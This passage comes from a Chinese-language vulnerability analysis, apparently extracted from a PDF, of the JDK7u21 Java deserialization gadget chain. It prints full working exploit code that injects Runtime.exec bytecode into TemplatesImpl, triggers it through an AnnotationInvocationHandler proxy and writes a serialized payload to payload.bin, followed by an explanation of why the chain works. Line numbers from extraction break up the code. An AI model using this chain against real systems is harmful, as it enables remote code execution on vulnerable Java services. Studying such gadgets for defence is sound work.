}
class Gadgets {
    static {
        // 启⽤SecurityManager时使⽤TemplatesImpl gadget的特殊情况
        System.setProperty(DESERIALIZE_TRANSLET, "true");
    }
    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
     //   private static final long serialVersionUID = -5971610431559700674L;
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws 
TransletException {}
    }
    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {
      //  private static final long serialVersionUID = 8207363842866235160L;
    }
    public static  T createProxy(final InvocationHandler ih, final Class iface, final Class ... ifaces) {
        final Class[] allIfaces
                = (Class[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(
                Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces , ih));
    }
    public static TemplatesImpl createTemplatesImpl() throws Exception {
        final TemplatesImpl templates = new TemplatesImpl();
        // use template gadget class
        // 获取容器ClassPool，注⼊classpath
        ClassPool pool = ClassPool.getDefault();
       // System.out.println("insertClassPath: " + new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        // 获取已经编译好的类
       // System.out.println("ClassName: " + StubTransletPayload.class.getName());
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
        // 在静态的的构造⽅法中插⼊payload
        clazz.makeClassInitializer()
                .insertAfter("java.lang.Runtime.getRuntime().exec(\""
                        +"open -a Calculator"
                        + "\");");
        // 给payload类设置⼀个名称
        // 允许重复执⾏的唯⼀名称（注意 PermGen 耗尽）
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        // 获取该类的字节码
        final byte[] classBytes = clazz.toBytecode();
        //System.out.println(Arrays.toString(classBytes));
        // 将类字节注⼊实例
        Reflections.setFieldValue(
                templates,
                "_bytecodes",
                new byte[][] {
                        classBytes,
                        ClassFiles.classAsBytes(Foo.class)
                });
        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        // 只要触发这个⽅法就能执⾏我们注⼊的bytecodes
        // templates.getOutputProperties();
        return templates;
    }
}
public class exp {
    public Object buildPayload() throws Exception {
        // ⽣成 evil 模板，如果触发 templates.getOutputProperties()，可以执⾏命令
        Object templates = Gadgets.createTemplatesImpl();
        // magic string, zeroHashCodeStr.hashCode() == 0
        String zeroHashCodeStr = "f5a5a608";
        // build a hash map, and put our evil templates in it.
        HashMap map = new HashMap();
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
结合payload看分析，明⽩payload为什么这样写，更容易帮助我们理解这个漏洞。
0x05 漏洞分析
        //map.put(zeroHashCodeStr, "foo");  // Not necessary
        // Generate proxy's handler，use `AnnotationInvocationHandler` as proxy's handler
        // When proxy is done，all call proxy.anyMethod() will be dispatch to AnnotationInvocationHandler's invoke 
method.
        Constructor ctor = 
Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);
//        Reflections.setFieldValue(tempHandler, "type", Templates.class);  // not necessary, because newInstance() 
already pass Templates.class to tempHandler
        Templates proxy = (Templates) Proxy.newProxyInstance(exp.class.getClassLoader(), 
templates.getClass().getInterfaces(), tempHandler);
       // Reflections.setFieldValue(templates, "_auxClasses", null);
       // Reflections.setFieldValue(templates, "_class", null);
        LinkedHashSet set = new LinkedHashSet(); // maintain order
        set.add(templates);     // save evil templates
        set.add(proxy);         // proxy
        map.put(zeroHashCodeStr, templates);
        return set;
    }
    public static void main(String[] args) throws Exception {
        exp exploit = new exp();
        Object payload = exploit.buildPayload();
        // test payload
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.bin"));
        oos.writeObject(payload);
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("payload.bin"));
        ois.readObject();
    }
}
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
如果分析过 CC 链或者看过 CC 链分析⽂章的朋友，⼀定知道在 CC 链中可以当成命令执⾏的
载体有以下两个类：
org.apache.commons.collections.functors.ChainedTransformer
org.apache.xalan.xsltc.trax.TemplatesImpl
我们知道要想实现 RCE 就必须要调⽤⼀个命令执⾏类， Runtime.getRuntime().exec() ，
CC 链中的 org.apache.commons.collections.functors.ChainedTransformer 类就存在
可以⽤于对象之间转换的 Transformer 接⼝，它有⼏个我们⽤得着的实现类，
ConstantTransformer、InvokerTransformer以及ChainedTransformer，利⽤这⼏个对象，就可
以构造出⼀个可以执⾏命令的链，从⽽达到命令执⾏的⽬的。
但若是没找到可以⽤于对象之间转换的接⼝或者这些接⼝在⿊名单中怎么办呢？
当依赖或者源程序中不存在可以执⾏命令的⽅法时，可以选择使⽤ TemplatesImpl
TemplatesImpl 作为命
令执⾏载体，并想办法去触发它的 newTransformer
newTransformer 或 getOutputProperties
getOutputProperties ⽅法
也就是上⾯我们所说的第⼆个类 org.apache.xalan.xsltc.trax.TemplatesImpl ，这个类
是 jdk7u21 原⽣ gadget 链中我们需要当初命令执⾏载体的类。
那么这个类如果构建 evil 类需要满⾜哪些条件呢？已经有师傅总结成了以下⼏个条件：
1. TemplatesImpl类的 _name  变量 != null
2. TemplatesImpl类的 _class 变量 == null
3. TemplatesImpl类的 _bytecodes  变量 != null
4. TemplatesImpl类的 _bytecodes 是我们代码执⾏的类的字节码。
5. 执⾏的恶意代码写在 _bytecodes  变量对应的类的静态⽅法或构造⽅法中。
6. TemplatesImpl类的 _bytecodes 是我们代码执⾏的类的字节码。 _bytecodes 中的类必
须是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的⼦
类
7. TemplatesImpl类的 _tfactory 需要是⼀个拥有 getExternalExtensionsMap() ⽅法的
类，通常使⽤ jdk ⾃带的 TransformerFactoryImpl() 类
TemplatesImpl 有四个⽅法：
TemplatesImpl.getOutputProperties()
TemplatesImpl.newTransformer()
TemplatesImpl.getTransletInstance()
TemplatesImpl.defineTransletClasses()
但是对于后两个来说，是 private ⽅法，只能被对象可调⽤⽅法间接调⽤，⽽前两者是 pub
lic ⽅法，可以被对象直接调⽤。
那么第⼀阶段我们便明⽩了——利⽤ TemplatesImpl 注⼊我们要构造的恶意类，然后想办法
触发它的 newTransformer 或 getOutputProperties ⽅法。
怎么触发？ frohoff 给了我们答案—— AnnotationInvocationHandler.invoke
那么这个⽅法为何能够触发呢？继续翻源码！
可以看到当调⽤⽅法为 equals 并满⾜相关条件时，会继续调⽤内部⽅法 equalsImpl() ，
跟进 equalsImpl()
 public Object invoke(Object proxy, Method method, Object[] args) {
        String member = method.getName();
        Class[] paramTypes = method.getParameterTypes();
        // Handle Object and Annotation methods
        if (member.equals("equals") && paramTypes.length == 1 &&
            paramTypes[0] == Object.class)
            return equalsImpl(args[0]);
        ...
    }
1
2
3
4
5
6
7
8
9
10
 private Boolean equalsImpl(Object o) {
        if (o == this)
            return true;
        if (!type.isInstance(o))
            return false;
        for (Method memberMethod : getMemberMethods()) {
            String member = memberMethod.getName();
            Object ourValue = memberValues.get(member);
            Object hisValue = null;
            AnnotationInvocationHandler hisHandler = asOneOfUs(o);
            if (hisHandler != null) {
                hisValue = hisHandler.memberValues.get(member);
            } else {
                try {
                    hisValue = memberMethod.invoke(o);
                } catch (InvocationTargetException e) {
                    return false;
                } catch (IllegalAccessException e) {
                    throw new AssertionError(e);
                }
1
2